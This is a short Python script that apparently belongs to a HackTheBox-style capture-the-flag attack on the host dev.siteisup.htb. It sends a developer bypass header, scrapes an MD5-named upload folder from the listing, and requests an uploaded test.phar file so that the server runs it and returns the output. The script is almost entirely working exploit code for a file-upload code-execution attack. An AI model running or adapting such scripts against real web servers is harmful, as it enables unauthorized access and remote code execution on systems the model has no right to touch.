import requests
import re

header = {"Special-Dev": "only4dev"}
r = requests.get("http://dev.siteisup.htb/uploads/",headers=header)
md5 = re.findall(r'(?i)(?<![a-z0-9])[a-f0-9]{32}(?![a-z0-9])',r.text)

file_get = requests.get("http://dev.siteisup.htb/uploads/"+md5[1]+"/test.phar",headers=header)
print(file_get.text)
